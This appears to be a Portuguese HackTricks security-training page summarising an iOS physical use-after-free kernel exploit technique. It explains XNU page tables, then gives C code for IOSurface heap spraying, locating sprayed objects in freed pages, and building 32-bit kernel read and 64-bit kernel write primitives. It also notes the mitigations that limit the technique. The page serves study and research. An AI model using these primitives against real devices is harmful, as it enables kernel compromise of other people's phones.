# iOS Physical Use-After-Free via IOSurface

{{#include ../../banners/hacktricks-training.md}}


## Physical use-after-free

Este é um resumo do post em [https://alfiecg.uk/2024/09/24/Kernel-exploit.html](https://alfiecg.uk/2024/09/24/Kernel-exploit.html); além disso, mais informações sobre exploit que usa esta técnica podem ser encontradas em [https://github.com/felix-pb/kfd](https://github.com/felix-pb/kfd)

### Gerenciamento de memória no XNU <a href="#memory-management-in-xnu" id="memory-management-in-xnu"></a>

O espaço de endereçamento de memória virtual para processos de usuário no iOS vai de **0x0 até 0x8000000000**. No entanto, esses endereços não mapeiam diretamente a memória física. Em vez disso, o **kernel** usa **tabelas de páginas** para traduzir endereços virtuais em endereços **físicos** reais.

#### Níveis das tabelas de páginas no iOS

As tabelas de páginas são organizadas hierarquicamente em três níveis:

1. **L1 Page Table (Level 1)**:
* Cada entrada aqui representa uma grande faixa de memória virtual.
* Ela cobre **0x1000000000 bytes** (ou **256 GB**) de memória virtual.
2. **L2 Page Table (Level 2)**:
* Uma entrada aqui representa uma região menor de memória virtual, especificamente **0x2000000 bytes** (32 MB).
* Uma entrada L1 pode apontar para uma tabela L2 se não puder mapear toda a região por si só.
3. **L3 Page Table (Level 3)**:
* Este é o nível mais fino, onde cada entrada mapeia uma única página de memória de **4 KB**.
* Uma entrada L2 pode apontar para uma tabela L3 se for necessário controle mais granular.

#### Mapeamento de virtual para físico

* **Mapeamento direto (Block Mapping)**:
* Algumas entradas em uma tabela de páginas mapeiam diretamente uma faixa de endereços virtuais para uma faixa contígua de endereços físicos (como um atalho).
* **Ponteiro para tabela de páginas filha**:
* Se for necessário controle mais fino, uma entrada em um nível (por exemplo, L1) pode apontar para uma **tabela de páginas filha** no próximo nível (por exemplo, L2).

#### Exemplo: Mapeando um endereço virtual

Suponha que você tente acessar o endereço virtual **0x1000000000**:

1. **L1 Table**:
* O kernel verifica a entrada da tabela L1 correspondente a esse endereço virtual. Se ela tiver um **ponteiro para uma tabela L2**, ele irá para essa tabela L2.
2. **L2 Table**:
* O kernel verifica a tabela L2 para um mapeamento mais detalhado. Se essa entrada apontar para uma **tabela L3**, ele prossegue para lá.
3. **L3 Table**:
* O kernel consulta a entrada final L3, que aponta para o **endereço físico** da página de memória real.

#### Exemplo de mapeamento de endereço

Se você escrever o endereço físico **0x800004000** no primeiro índice da tabela L2, então:

* Endereços virtuais de **0x1000000000** até **0x1002000000** mapeiam para endereços físicos de **0x800004000** até **0x802004000**.
* Isto é um **mapeamento de bloco** no nível L2.

Alternativamente, se a entrada L2 apontar para uma tabela L3:

* Cada página de 4 KB na faixa virtual **0x1000000000 -> 0x1002000000** seria mapeada por entradas individuais na tabela L3.

### Physical use-after-free

Um **physical use-after-free** (UAF) ocorre quando:

1. Um processo **aloca** alguma memória como **legível e gravável**.
2. As **tabelas de páginas** são atualizadas para mapear essa memória para um endereço físico específico que o processo pode acessar.
3. O processo **desaloca** (libera) a memória.
4. Porém, devido a um **bug**, o kernel **esquece de remover o mapeamento** das tabelas de páginas, mesmo marcando a memória física correspondente como livre.
5. O kernel pode então **realocar essa memória física "liberada"** para outros fins, como **dados do kernel**.
6. Como o mapeamento não foi removido, o processo ainda pode **ler e escrever** nessa memória física.

Isso significa que o processo pode acessar **páginas da memória do kernel**, que podem conter dados sensíveis ou estruturas, potencialmente permitindo que um atacante **manipule a memória do kernel**.

### IOSurface Heap Spray

Como o atacante não controla quais páginas específicas do kernel serão alocadas para a memória liberada, ele usa uma técnica chamada **heap spray**:

1. O atacante **cria um grande número de objetos IOSurface** na memória do kernel.
2. Cada objeto IOSurface contém um **valor mágico** em um de seus campos, tornando-o fácil de identificar.
3. Eles **escaneiam as páginas liberadas** para ver se algum desses objetos IOSurface caiu em uma página liberada.
4. Quando encontram um objeto IOSurface em uma página liberada, podem usá-lo para **ler e escrever** na memória do kernel.

Mais informações sobre isso em [https://github.com/felix-pb/kfd/tree/main/writeups](https://github.com/felix-pb/kfd/tree/main/writeups)

> [!TIP]
> Esteja ciente de que dispositivos iOS 16+ (A12+) trazem mitigações de hardware (como PPL ou SPTM) que tornam técnicas de physical UAF muito menos viáveis.
> PPL aplica proteções MMU estritas em páginas relacionadas a code signing, entitlements e dados sensíveis do kernel, então, mesmo que uma página seja reutilizada, escritas do userland ou de código kernel comprometido em páginas protegidas por PPL são bloqueadas.
> Secure Page Table Monitor (SPTM) estende o PPL endurecendo as próprias atualizações das tabelas de páginas. Ele garante que mesmo código privilegiado do kernel não possa remapear silenciosamente páginas liberadas ou adulterar mapeamentos sem passar por verificações seguras.
> KTRR (Kernel Text Read-Only Region) bloqueia a seção de código do kernel como somente leitura após o boot. Isso impede quaisquer modificações em tempo de execução ao código do kernel, fechando um grande vetor de ataque que exploits de physical UAF frequentemente exploram.
> Além disso, alocações `IOSurface` são menos previsíveis e mais difíceis de mapear em regiões acessíveis pelo usuário, o que torna o truque de “escaneamento por valor mágico” muito menos confiável. E `IOSurface` agora é protegido por entitlements e restrições de sandbox.

### Processo passo a passo do Heap Spray

1. **Spray IOSurface Objects**: O atacante cria muitos objetos IOSurface com um identificador especial ("valor mágico").
2. **Scan Freed Pages**: Eles verificam se algum dos objetos foi alocado em uma página liberada.
3. **Read/Write Kernel Memory**: Manipulando campos no objeto IOSurface, obtêm a capacidade de realizar **reads e writes arbitrários** na memória do kernel. Isso permite:
* Usar um campo para **ler qualquer valor 32-bit** na memória do kernel.
* Usar outro campo para **escrever valores 64-bit**, alcançando uma primitiva estável de **kernel read/write**.

Generate IOSurface objects with the magic value IOSURFACE\_MAGIC to later search for:
```c
void spray_iosurface(io_connect_t client, int nSurfaces, io_connect_t **clients, int *nClients) {
if (*nClients >= 0x4000) return;
for (int i = 0; i < nSurfaces; i++) {
fast_create_args_t args;
lock_result_t result;

size_t size = IOSurfaceLockResultSize;
args.address = 0;
args.alloc_size = *nClients + 1;
args.pixel_format = IOSURFACE_MAGIC;

IOConnectCallMethod(client, 6, 0, 0, &args, 0x20, 0, 0, &result, &size);
io_connect_t id = result.surface_id;

(*clients)[*nClients] = id;
*nClients = (*nClients) += 1;
}
}
```
Procurar por objetos **`IOSurface`** em uma página física liberada:
```c
int iosurface_krw(io_connect_t client, uint64_t *puafPages, int nPages, uint64_t *self_task, uint64_t *puafPage) {
io_connect_t *surfaceIDs = malloc(sizeof(io_connect_t) * 0x4000);
int nSurfaceIDs = 0;

for (int i = 0; i < 0x400; i++) {
spray_iosurface(client, 10, &surfaceIDs, &nSurfaceIDs);

for (int j = 0; j < nPages; j++) {
uint64_t start = puafPages[j];
uint64_t stop = start + (pages(1) / 16);

for (uint64_t k = start; k < stop; k += 8) {
if (iosurface_get_pixel_format(k) == IOSURFACE_MAGIC) {
info.object = k;
info.surface = surfaceIDs[iosurface_get_alloc_size(k) - 1];
if (self_task) *self_task = iosurface_get_receiver(k);
goto sprayDone;
}
}
}
}

sprayDone:
for (int i = 0; i < nSurfaceIDs; i++) {
if (surfaceIDs[i] == info.surface) continue;
iosurface_release(client, surfaceIDs[i]);
}
free(surfaceIDs);

return 0;
}
```
### Alcançando leitura/escrita no kernel com IOSurface

Após obter controle sobre um objeto IOSurface na memória do kernel (mapeado para uma página física liberada acessível a partir do userspace), podemos usá-lo para **operações arbitrárias de leitura e escrita no kernel**.

**Key Fields in IOSurface**

O objeto IOSurface tem dois campos cruciais:

1. **Use Count Pointer**: Permite uma **leitura de 32 bits**.
2. **Indexed Timestamp Pointer**: Permite uma **escrita de 64 bits**.

Ao sobrescrever esses ponteiros, fazemos com que apontem para endereços arbitrários na memória do kernel, permitindo operações de leitura e escrita.

#### Leitura de 32 bits no kernel

Para realizar uma leitura:

1. Sobrescreva o **use count pointer** para apontar para o endereço alvo menos um deslocamento de 0x14 bytes.
2. Use o método `get_use_count` para ler o valor nesse endereço.
```c
uint32_t get_use_count(io_connect_t client, uint32_t surfaceID) {
uint64_t args[1] = {surfaceID};
uint32_t size = 1;
uint64_t out = 0;
IOConnectCallMethod(client, 16, args, 1, 0, 0, &out, &size, 0, 0);
return (uint32_t)out;
}

uint32_t iosurface_kread32(uint64_t addr) {
uint64_t orig = iosurface_get_use_count_pointer(info.object);
iosurface_set_use_count_pointer(info.object, addr - 0x14); // Offset by 0x14
uint32_t value = get_use_count(info.client, info.surface);
iosurface_set_use_count_pointer(info.object, orig);
return value;
}
```
#### 64-Bit Kernel Write

Para realizar uma escrita:

1. Sobrescreva o **indexed timestamp pointer** com o endereço de destino.
2. Use o método `set_indexed_timestamp` para escrever um valor de 64 bits.
```c
void set_indexed_timestamp(io_connect_t client, uint32_t surfaceID, uint64_t value) {
uint64_t args[3] = {surfaceID, 0, value};
IOConnectCallMethod(client, 33, args, 3, 0, 0, 0, 0, 0, 0);
}

void iosurface_kwrite64(uint64_t addr, uint64_t value) {
uint64_t orig = iosurface_get_indexed_timestamp_pointer(info.object);
iosurface_set_indexed_timestamp_pointer(info.object, addr);
set_indexed_timestamp(info.client, info.surface, value);
iosurface_set_indexed_timestamp_pointer(info.object, orig);
}
```
#### Exploit Flow Recap

1. **Trigger Physical Use-After-Free**: páginas liberadas estão disponíveis para reutilização.
2. **Spray IOSurface Objects**: aloque muitos objetos IOSurface com um único "magic value" na kernel memory.
3. **Identify Accessible IOSurface**: localize um IOSurface em uma página liberada que você controla.
4. **Abuse Use-After-Free**: modifique ponteiros no objeto IOSurface para habilitar **kernel read/write** arbitrário via métodos IOSurface.

Com essas primitivas, o exploit fornece **32-bit reads** controladas e **64-bit writes** para kernel memory. Passos adicionais do jailbreak podem envolver primitivas de read/write mais estáveis, que podem requerer contornar proteções adicionais (por exemplo, PPL em dispositivos arm64e mais novos).

{{#include ../../banners/hacktricks-training.md}}
